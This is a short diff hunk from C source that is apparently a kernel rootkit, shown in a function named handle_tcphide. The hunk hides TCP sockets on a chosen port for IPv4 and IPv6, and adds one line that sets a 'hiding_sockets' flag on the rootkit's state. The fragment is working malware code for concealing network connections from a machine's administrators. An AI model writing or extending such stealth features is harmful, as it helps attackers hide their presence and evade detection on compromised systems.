@@ -206,6 +206,7 @@ handle_tcphide(unsigned long arg)
 
         hide_port((port_t)sarg, tcp4);
         hide_port((port_t)sarg, tcp6);
+        rootkit.hiding_sockets = 1;
         DEBUG_NOTICE("[g7] hiding tcp socket with port %ld\n", sarg);
     }
 
